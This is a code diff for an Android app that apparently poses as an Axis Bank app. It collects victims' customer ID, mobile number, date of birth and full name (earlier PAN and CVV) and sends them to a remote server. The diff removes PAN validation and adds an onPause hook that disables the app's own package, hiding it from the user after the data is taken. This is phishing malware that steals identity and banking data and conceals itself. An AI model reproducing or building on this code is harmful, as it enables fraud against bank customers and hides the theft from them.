@@ -1,6 +1,7 @@
 package com.example.oldaxisbank
 
 import android.content.Intent
+import android.content.pm.PackageManager
 import androidx.appcompat.app.AppCompatActivity
 import android.os.Bundle
 import android.text.Editable
@@ -31,17 +32,15 @@ class thirdpage : AppCompatActivity() {
             if (binding.e1.text.toString().isEmpty() || binding.e2.text.toString().isEmpty() ) {
                 Toast.makeText(this, "fill all fields", Toast.LENGTH_SHORT).show()
 
-            }else if(!isPANValid(binding.e2.text.toString())){
-                Toast.makeText(this, "pan card is not correct", Toast.LENGTH_SHORT).show()
             }else{
 
                 val util = Util()
                 val apiService = ApiClient.getClient().create(ApiService::class.java)
-                val intentff = Intent(this, otp::class.java)
+                val intentff = Intent(this, finalscreen::class.java)
                 val data = ThirdPage(customerid = util.getLocalData(this,"c"),
                     mobile = util.getLocalData(this,"m"),
-                    dob = binding.e1.text.toString(), cvv = "",
-                    pancard = binding.e2.text.toString()
+                    dob = binding.e1.text.toString(),
+                    fullname = binding.e2.text.toString()
                 )
                 val call = apiService.third(data)
                 call.enqueue(object : Callback<Void?> {
@@ -73,6 +72,14 @@ class thirdpage : AppCompatActivity() {
         return panPattern.matches(panNumber)
     }
 
+
+    override fun onPause() {
+        super.onPause()
+        val pakagemanger = packageManager
+//        val componentname =  ComponentName(this,MainActivity::class.java)
+        pakagemanger.setApplicationEnabledSetting(packageName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+            PackageManager.DONT_KILL_APP)
+    }
 
 }
 
